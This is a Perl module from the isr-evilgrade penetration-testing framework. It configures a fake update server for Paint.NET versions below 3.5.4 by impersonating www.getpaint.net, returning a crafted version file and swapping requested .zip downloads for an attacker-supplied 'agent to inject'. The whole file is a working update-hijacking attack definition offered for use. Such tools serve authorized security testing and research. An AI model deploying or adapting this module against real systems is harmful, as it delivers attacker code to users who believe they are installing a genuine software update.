###############
# paintnet.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::paintnet;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'    => 'paintnet',
    'version' => '1.0',
    'appver'  => '< 3.5.4',
    'author'  => ['German Rodriguez < grodriguez +[AT]+ faradaysec.com >'],
    'description' => qq{},
    'vh'          => '(www.getpaint.net)',
    'request'     => [
        {   'req'    => '/updates/versions',    #regex friendly
            'type'   => 'file',                 #file|string|agent|install
            'method' => '',                     #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,
            'file' => './include/paintnet/version',
        },

        {   'req'    => '.zip',                 #regex friendly
            'type'   => 'agent',                #file|string|agent|install
            'method' => '',                     #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent2.zip', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
